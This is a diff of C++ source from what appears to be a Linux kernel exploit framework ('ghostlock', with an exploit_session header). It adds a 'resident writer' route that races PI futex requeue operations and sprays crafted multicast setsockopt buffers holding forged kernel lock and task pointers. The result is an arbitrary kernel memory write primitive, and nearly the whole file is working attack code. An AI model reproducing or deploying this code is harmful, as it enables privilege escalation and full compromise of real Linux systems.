@@ -1,44 +1,241 @@
 #include "routes/multicast_waiter_route.h"
 
-void multicast_waiter_route_context_init(
-        MulticastWaiterRouteContext *context,
-        PiRaceContext *race,
-        const WriteRequest *request,
-        const struct execution_settings *execution,
-        MulticastWaiterLayout layout,
-        int resident) {
-    context->race = race;
-    context->request = request;
-    context->execution = execution;
-    context->layout = layout;
-    context->lock1_futex = 0;
-    context->lock2_futex = 0;
-    context->condition_futex = 0;
-    context->owner_worker = {};
-    context->waiter_worker = {};
-    context->owner_worker_started = 0;
-    context->waiter_worker_started = 0;
-    context->target = 0;
-    context->value = 0;
-    context->lock = 0;
-    context->task = 0;
+#include <netinet/in.h>
+#include <time.h>
+#include <unistd.h>
+
+#if defined(__clang__)
+#pragma clang diagnostic ignored "-Wvla-cxx-extension"
+#endif
+
+#include "common.h"
+#include "session/exploit_session.hpp"
+#include "target.h"
+
+/* Resident Multicast Waiter route owner (CPP13). The process-level instance
+ * lives at file scope so every inlined access expands exactly like the
+ * validated direct reference; the kernel5_resident_* wrappers in
+ * route_operations.cpp forward to it. The two workers and the disarm/destroy
+ * helpers stay translation-unit local. */
+
+namespace {
+
+MulticastWaiterRoute multicast_resident_route;
+
+static double fops_elapsed_ms(struct timespec *ref) {
+    return runtime_elapsed_ms(ref);
+}
+
+static const struct execution_settings *resident_execution_settings(void) {
+    return target_profile_execution(&g_target_profile);
+}
+
+static void multicast_waiter_interrupt(int sig) {
+    (void) sig;
+}
+
+static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
+    struct sched_param sp = {.sched_priority = 0};
+    int next = context->scheduler_policy == SCHED_NORMAL
+            ? SCHED_BATCH : SCHED_NORMAL;
+    long r = syscall(SYS_sched_setscheduler,
+            atomic_load(&context->waiter_tid), next, &sp);
+    context->scheduler_policy = next;
+    return r;
+}
+
+static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
+        uintptr_t target, uintptr_t value,
+        uintptr_t lock) {
+    size_t size = context->layout.buffer_size;
+    __extension__ unsigned char b[size];
+    size_t o = context->layout.waiter_offset;
+    memset(b, 0, sizeof(b));
+    if (target) {
+        ghostlock::support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
+        ghostlock::support::put64(b, o + 8, value);
+    }
+    ghostlock::support::put64(b, o + context->layout.task_offset, context->task);
+    ghostlock::support::put64(b, o + context->layout.lock_offset, lock);
+    uint16_t family = AF_UNSPEC;
+    memcpy(b + 8, &family, sizeof(family));
+    return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
+            b, (socklen_t) sizeof(b));
+}
+
+static void *multicast_waiter_worker(void *arg) {
+    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
+    pin_to_core((size_t) context->consumer_cpu);
+    sigset_t set;
+    sigemptyset(&set);
+    sigaddset(&set, SIGUSR1);
+    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
+    atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    atomic_store(&context->waiter_has_lock2, 1);
+    while (!atomic_load(&context->owner_has_lock1)) sched_yield();
+    atomic_store(&context->waiter_waiting, 1);
+    ghostlock::support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
+            0, NULL, &context->lock1_futex, 0);
+    context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+    if (context->socket_fd < 0) return NULL;
+    multicast_waiter_stamp(context, 0, 0, context->lock);
+    atomic_store(&context->waiter_ready, 1);
+    while (!atomic_load(&context->stop_requested)) {
+        if (atomic_exchange(&context->respray_requested, 0)) {
+            uintptr_t lock = context->lock + context->layout.lock_slots_offset +
+                    ((size_t) context->lock_slot++ % context->layout.lock_slot_count) *
+                            context->layout.lock_slot_stride;
+            multicast_waiter_stamp(context, context->target, context->value, lock);
+            atomic_store(&context->sprayed, 1);
+        }
+        sched_yield();
+    }
+    uint32_t dummy = 0x80000000U | (uint32_t) getpid();
+    struct timespec z = {0, 0};
+    ghostlock::support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    while (!atomic_load(&context->owner_done)) sched_yield();
+    close(context->socket_fd);
     context->socket_fd = -1;
-    context->main_cpu = race ? race->main_cpu : 0;
-    context->consumer_cpu = race ? race->consumer_cpu : 0;
-    context->scheduler_policy = 0; /* SCHED_NORMAL/SCHED_OTHER */
-    context->resident = resident;
+    return NULL;
+}
+
+static void *multicast_owner_worker(void *arg) {
+    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
+    pin_to_core((size_t) context->main_cpu);
+    while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
+    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    atomic_store(&context->owner_has_lock1, 1);
+    atomic_store(&context->owner_waiting, 1);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    atomic_store(&context->owner_done, 1);
+    return NULL;
+}
+
+static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
+    atomic_store(&context->stop_requested, 1);
+    atomic_store(&context->race->consumer_go, 0);
+    while (atomic_load(&context->race->consumer_inflight)) sched_yield();
+    context->status.kernel_disarmed = 1;
+}
+
+static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
+    if (context->waiter_worker_started) {
+        pthread_join(context->waiter_worker, NULL);
+        context->waiter_worker_started = 0;
+    }
+    if (context->owner_worker_started) {
+        pthread_join(context->owner_worker, NULL);
+        context->owner_worker_started = 0;
+    }
+    if (context->socket_fd >= 0) {
+        close(context->socket_fd);
+        context->socket_fd = -1;
+    }
     context->ready = 0;
-    context->lock_slot = 0;
-    context->status = {};
-    context->status.code = ROUTE_RETRYABLE;
-    atomic_store_explicit(&context->waiter_has_lock2, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->owner_has_lock1, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->waiter_waiting, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->owner_waiting, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->waiter_ready, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->respray_requested, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->sprayed, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->stop_requested, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->owner_done, 0, memory_order_relaxed);
-    atomic_store_explicit(&context->waiter_tid, 0, memory_order_relaxed);
+    context->status.userspace_clean = 1;
+    if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
+        context->status.code = ROUTE_FALLBACK_SAFE;
+    }
+}
+
+}  // namespace
+
+int MulticastWaiterRoute::start() noexcept {
+    auto *context = this;
+    if (context->ready) return 1;
+    if (context->waiter_worker_started || context->owner_worker_started) {
+        pr_warning("multicast resident remains partially armed; refusing restart\n");
+        return 0;
+    }
+    MulticastWaiterLayout layout_value =
+            target_profile_multicast_waiter_layout(&g_target_profile);
+    const struct execution_settings *execution = resident_execution_settings();
+    context->init(
+            &ghostlock::g_exploit_session.race, NULL, execution, layout_value, 1);
+    context->main_cpu = runtime_config_snapshot().main_cpu;
+    context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
+    uintptr_t bss = resolved_addresses_data_alias(
+            &g_resolved_addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
+    context->lock = bss + layout_value.fake_lock_offset;
+    context->task = bss + layout_value.fake_task_offset;
+    struct sigaction sa = {};
+    sa.sa_handler = multicast_waiter_interrupt;
+    sigemptyset(&sa.sa_mask);
+    if (sigaction(SIGUSR1, &sa, NULL) != 0) return 0;
+    if (pthread_create(&context->waiter_worker, NULL,
+            multicast_waiter_worker, context) != 0)
+        return 0;
+    context->waiter_worker_started = 1;
+    if (pthread_create(&context->owner_worker, NULL,
+            multicast_owner_worker, context) != 0)
+        return 0;
+    context->owner_worker_started = 1;
+    struct timespec ready_started;
+    clock_gettime(CLOCK_MONOTONIC, &ready_started);
+    while (!(atomic_load(&context->waiter_has_lock2) &&
+            atomic_load(&context->owner_has_lock1) &&
+            atomic_load(&context->waiter_waiting) &&
+            atomic_load(&context->owner_waiting))) {
+        if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
+            return 0;
+        sched_yield();
+    }
+    usleep(execution->multicast_post_requeue_settle_us);
+    errno = 0;
+    long r = ghostlock::support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
+            1, (void *) 0, &context->lock1_futex, 0);
+    context->condition_futex = 1;
+    syscall(SYS_tgkill, getpid(), atomic_load(&context->waiter_tid), SIGUSR1);
+    if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
+    clock_gettime(CLOCK_MONOTONIC, &ready_started);
+    while (!atomic_load(&context->waiter_ready) &&
+            fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
+        sched_yield();
+    if (!atomic_load(&context->waiter_ready) ||
+            multicast_waiter_adjust(context) < 0)
+        return 0;
+    usleep(execution->multicast_post_adjust_settle_us);
+    context->ready = 1;
+    context->status.code = ROUTE_OK;
+    pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
+            bss, context->lock, context->task);
+    return 1;
+}
+
+int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
+    auto *context = this;
+    if (!context->ready) return 0;
+    context->target = target;
+    context->value = value;
+    atomic_store(&context->sprayed, 0);
+    atomic_store(&context->respray_requested, 1);
+    while (!atomic_load(&context->sprayed)) sched_yield();
+    long r = multicast_waiter_adjust(context);
+    pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
+    return r == 0;
+}
+
+void MulticastWaiterRoute::stop() noexcept {
+    auto *context = this;
+    if (!context->ready) {
+        if (context->waiter_worker_started || context->owner_worker_started) {
+            context->status.code = ROUTE_DIRTY_FAILURE;
+            pr_warning("multicast resident partial setup retained for process exit\n");
+        }
+        return;
+    }
+    multicast_waiter_disarm(context);
+    multicast_waiter_destroy(context);
+    /* SESSION-04: the route owns only its route resources; reaping the
+     * HeapContext references is the session's step after destroy. */
+    ghostlock::g_exploit_session.release_resident_heap();
+    pr_success("5.x resident writer disarmed\n");
+}
+
+MulticastWaiterRoute &resident_route(void) {
+    return multicast_resident_route;
 }
